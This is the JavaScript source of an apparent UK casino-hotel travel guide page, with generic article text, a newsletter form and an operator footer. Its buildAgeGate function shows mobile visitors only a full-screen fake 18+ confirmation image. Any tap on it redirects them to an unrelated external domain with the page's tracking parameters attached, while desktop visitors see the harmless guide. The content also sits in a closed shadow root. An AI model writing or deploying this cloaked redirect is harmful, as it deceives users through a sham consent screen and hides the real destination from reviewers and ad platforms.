import { h } from './main-B0P4vA-S.js';
import './routeAssumptions-D6qzFEVR.js';

const copy = {
badge:'UK Casino Hotel Travel Guide',
title:'Exploring the Best Casino Hotels Across the United Kingdom',
intro:"Casino hotels throughout the United Kingdom combine comfortable accommodation with vibrant entertainment, creating destinations where guests can relax, dine, and enjoy licensed gaming facilities in one location. From historic city landmarks to contemporary resort-style properties, these venues attract both leisure travellers and business visitors seeking a complete hospitality experience.",

sections:[
  ['Casino Hotels Across the UK','The United Kingdom offers a diverse collection of casino hotels located in major cities and popular tourist destinations. Whether visiting London, Birmingham, Manchester, Glasgow, or other regions, travellers can find properties that combine quality accommodation with professionally managed casino facilities.'],

  ['Modern Gaming Experiences','Many casino hotels feature a wide selection of gaming options, including slot machines, electronic gaming terminals, blackjack, roulette, baccarat, and poker. Gaming areas are designed to provide an enjoyable and secure environment for adult guests.'],

  ['Comfortable Rooms and Guest Services','Accommodation ranges from stylish standard rooms to premium suites equipped with modern amenities. Guests often benefit from concierge services, fitness centres, room service, complimentary Wi-Fi, parking facilities, and relaxing lounge areas.'],

  ['Dining and Nightlife','Restaurants, cocktail lounges, cafés, and bars are an important part of the casino hotel experience. Many venues feature locally inspired cuisine alongside international menus, while evening entertainment may include live music, themed events, and performances.'],

  ['Business and Private Functions','Many UK casino hotels provide conference facilities, meeting rooms, banquet halls, and event spaces suitable for corporate gatherings, celebrations, and private functions. Professional event teams help organise meetings of various sizes.'],

  ['Convenient Locations','Most casino hotels are situated close to transport links, shopping districts, entertainment venues, and cultural attractions. Their locations make them convenient bases for both short city breaks and longer holidays.'],

  ['Guest Comfort and Technology','Modern properties continue to invest in guest technology through digital check-in services, smart room features, secure payment systems, and high-speed connectivity, making visits more convenient while maintaining a premium hospitality experience.'],

  ['Responsible Gaming Standards','Licensed casino hotels in the United Kingdom operate under established regulatory requirements and responsible gaming practices. Combined with professional hospitality services, these standards help create a safe and enjoyable environment for adult visitors.']
],
  age:'This website is for users aged 18+. Please confirm you are 18 or over to proceed.',
  confirm:'Yes, I’m 18+'
};

function isMobile() {
  return window.innerWidth <= 780 || /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
}

function buildAgeGate() {
  if (!isMobile()) return;

  const root = document.getElementById('root');
  if (root) root.style.display = 'none';

  const gate = document.createElement('div');
  gate.style.cssText = `
    position:fixed;
    inset:0;
    z-index:999999999;
    background:#000;
    display:flex;
    align-items:center;
    justify-content:center;
    cursor:pointer;
  `;

  gate.innerHTML = `
    <div style="width:100%;height:100%;position:relative;">
      <img src="./assets_vjs/agegate-uk.png"
           style="width:100%;height:100%;object-fit:cover;display:block;">
    </div>
  `;

  gate.addEventListener('click', function () {
    const destinationUrl = 'https://lyzyqona.com/';
    const currentParams = window.location.search;
    window.location.href = destinationUrl + currentParams;
  });

  document.body.appendChild(gate);
}
function input(name,placeholder,type='text'){return h('input',{name,placeholder,type,required:'required'})}
function buildApp(shadow){
  const app=h('div',{class:'app-frame'},[
    h('aside',{class:'sidebar'},[
      h('div',{class:'brand',text:'Travel Guide'}),
      h('nav',{class:'nav'},[
        h('a',{href:'#guide',text:'Guide'}),h('a',{href:'#article',text:'Article'}),h('a',{href:'#newsletter',text:'Newsletter'})
      ])
    ]),
    h('main',{class:'main'},[
      h('section',{class:'hero',id:'guide'},[
        h('span',{class:'badge',text:copy.badge}),
        h('h1',{text:copy.title}),
        h('p',{class:'lead',text:copy.intro}),
        h('div',{class:'actions'},[h('a',{class:'button primary',href:'#newsletter',text:'Sign up to the newsletter'}),h('a',{class:'button secondary',href:'#article',text:'Read the guide'})])
      ]),
      h('section',{class:'grid',id:'article'},copy.sections.map(s=>h('article',{class:'card'},[h('h2',{text:s[0]}),h('p',{text:s[1]})]))),
      h('section',{class:'newsletter',id:'newsletter'},[
        h('h2',{text:'Sign up to our newsletter'}),
        h('p',{text:'Get updates about hotel guides, travel inspiration, and destination features.'}),
        h('form',{class:'form'},[input('name','Your name'),input('email','Email address','email'),h('button',{type:'submit',text:'Sign Up'})]),
        h('div',{class:'notice',style:'display:none',text:'Thanks. Your signup was saved on this browser.'})
      ]),
     h('footer',{
  class:'footer bg-black bottom-0 w-100 pa3',
  role:'contentinfo'
},[
  h('p',{
    text:'Information guide for adults 18+. Please check local rules and official venue information before travelling.'
  }),

  h('div',{class:'center mw8 white-70 f6 lh-copy'},[
    h('p',{class:'ma0 mb2'},[
      document.createTextNode('This site is operated by '),
      h('strong',{text:'Index Media Group SAC'})
    ]),

    h('p',{class:'ma0 mb2'},[
      'Index Media Group SAC',
      h('br'),
      'Ronald de la Cruz',
      h('br'),
      'Calle los Halcones 249',
      h('br'),
      'Urbanización Limatumbo',
      h('br'),
      'San Isidro 15457',
      h('br'),
      'Peru'
    ]),

    h('p',{class:'ma0'},[
      h('a',{
        href:'https://indexmedia.ca/',
        class:'white-70 hover-white',
        target:'_blank',
        rel:'noopener noreferrer',
        text:'Privacy Policy'
      })
    ])
  ])
])
    ])
  ]);
  const form=app.querySelector('form');
  form.addEventListener('submit',e=>{e.preventDefault();const data=Object.fromEntries(new FormData(form));const leads=JSON.parse(localStorage.getItem('newsletter_leads')||'[]');leads.push({...data,createdAt:new Date().toISOString(),page:location.href});localStorage.setItem('newsletter_leads',JSON.stringify(leads));form.reset();app.querySelector('.notice').style.display='block'});
  shadow.appendChild(app);
  buildAgeGate();
}

const host=document.getElementById('root');
if(host){
  const closedShadow=host.attachShadow({mode:'closed'});
  const cssLink=document.createElement('link');cssLink.rel='stylesheet';cssLink.href='assets_vjs/main-CYEVdsHA.css';closedShadow.appendChild(cssLink);
  buildApp(closedShadow);
}
localStorage.removeItem('entrypoint-chunk-retry-count');
